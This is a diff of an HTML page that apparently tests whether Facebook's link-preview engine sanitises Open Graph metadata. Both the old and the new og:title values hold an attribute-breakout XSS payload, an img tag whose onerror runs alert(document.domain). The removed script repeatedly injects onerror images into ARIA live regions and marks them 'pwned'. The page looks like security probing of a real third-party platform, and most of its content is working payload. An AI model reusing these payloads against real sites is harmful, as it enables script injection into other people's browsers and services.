@@ -4,29 +4,18 @@
     <meta charset="UTF-8">
     <meta property="fb:app_id" content="966242223397117">
     <meta property="og:url" content="https://xsstestfb.vercel.app/">
-    <meta property="og:type" content="article">
+    <meta property="og:type" content="website">
     
-    <meta property="og:title" content='Verified Security "><img src=x onerror="alert(document.domain)" aria-live="assertive">'>
-    <meta property="og:description" content="Important Update regarding hasn0x security research.">
+    <meta property="og:title" content='Verified "><div aria-live="assertive"><img src=x onerror="alert(document.domain)"></div>'>
+    <meta property="og:description" content="Security check for hasn0x research project.">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png">
 
-    <title>Exploit Research - hasn0x</title>
+    <title>XSS Test - hasn0x</title>
 </head>
 <body>
-    <script>
-        // তোমার কনসোলের লজিকটি এখানেও দিয়ে রাখছি যাতে পেজটি লোড হলে কাজ করার সুযোগ পায়
-        setInterval(() => {
-            const alerts = document.querySelectorAll('[aria-live="assertive"], [aria-live="polite"]');
-            alerts.forEach(alertBox => {
-                if (!alertBox.dataset.pwned) {
-                    alertBox.dataset.pwned = "true";
-                    const img = document.createElement('img');
-                    img.src = 'x';
-                    img.onerror = () => { alert('hasn0x_Stored_XSS_Confirmed'); };
-                    alertBox.appendChild(img);
-                }
-            });
-        }, 500);
-    </script>
+    <div style="text-align: center; margin-top: 50px;">
+        <h1>Targeting ARIA Regions</h1>
+        <p>Testing if Facebook's preview engine sanitizes dynamic attributes.</p>
+    </div>
 </body>
 </html>
